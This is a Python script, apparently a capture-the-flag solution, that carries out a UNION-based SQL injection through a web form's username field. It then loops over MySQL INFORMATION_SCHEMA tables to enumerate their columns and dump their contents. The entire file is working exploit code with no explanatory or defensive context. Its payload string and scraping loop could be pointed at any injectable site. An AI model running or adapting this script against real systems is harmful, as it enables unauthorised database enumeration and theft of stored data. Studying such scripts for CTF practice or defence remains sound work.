#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-10-27 16:14:21
# @Last Modified by:   john
# @Last Modified time: 2016-10-31 17:44:56

import requests
import re

tables = ["CHARACTER_SETS","COLLATIONS","COLLATION_CHARACTER_SET_APPLICABILITY","COLUMNS","COLUMN_PRIVILEGES","ENGINES","EVENTS","FILES","GLOBAL_STATUS","GLOBAL_VARIABLES","KEY_COLUMN_USAGE","OPTIMIZER_TRACE	","PARAMETERS","PARTITIONS","PLUGINS","PROCESSLIST","PROFILING","REFERENTIAL_CONSTRAINTS","ROUTINES","SCHEMATA","SCHEMA_PRIVILEGES","SESSION_STATUS","SESSION_VARIABLES","STATISTICS","TABLES","TABLESPACES","TABLE_CONSTRAINTS","TABLE_PRIVILEGES","TRIGGERS","USER_PRIVILEGES","VIEWS","INNODB_LOCKS","INNODB_TRX","INNODB_SYS_DATAFILES","INNODB_FT_CONFIG","INNODB_SYS_VIRTUAL","INNODB_CMP","INNODB_FT_BEING_DELETED","INNODB_CMP_RESET","INNODB_CMP_PER_INDEX","INNODB_CMPMEM_RESET","INNODB_FT_DELETED","INNODB_BUFFER_PAGE_LRU","INNODB_LOCK_WAITS","INNODB_TEMP_TABLE_INFO","INNODB_SYS_INDEXES","INNODB_SYS_TABLES","INNODB_SYS_FIELDS","INNODB_CMP_PER_INDEX_RESET","INNODB_BUFFER_PAGE","INNODB_FT_DEFAULT_STOPWORD","INNODB_FT_INDEX_TABLE","INNODB_FT_INDEX_CACHE","INNODB_SYS_TABLESPACES","INNODB_METRICS","INNODB_SYS_FOREIGN_COLS","INNODB_CMPMEM","INNODB_BUFFER_POOL_STATS","INNODB_SYS_COLUMNS","INNODB_SYS_FOREIGN","INNODB_SYS_TABLESTATS"]

base_injection = "m' UNION SELECT 1, ? #"

url = 'http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/'

def scrape( response_string ):

	to_remove = {'<td>':"|",'<tr>':"\n",'</tr>':"",'</td>':""}

	string = response_string.replace("\n", '')
	string = re.findall( r"tbody>(.*)</tbody", string, re.MULTILINE)[0]
	string = string.replace('\t','')
	for item in to_remove.iteritems():
		string = string.replace(item[0],item[1])

	return string.split('|')[-1]

r = requests.get( url )

def send( username ):

	r = requests.post( url, data = {"username": username} );
	return r

def select( string ):
	it  = base_injection.replace('?',string)
	return it 


def gather( string ):

	return scrape( send( select( string ) ).text)	


for table in tables:
	
	columns = gather('GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="???"'.replace('???',table))
	columns = columns.split(',')
	for column in columns:
		print gather('GROUP_CONCAT( ' + column + ' ) FROM INFORMATION_SCHEMA.<TABLE NAME>'.replace("<COLUMN_NAME>",column).replace('<TABLE NAME>', table))
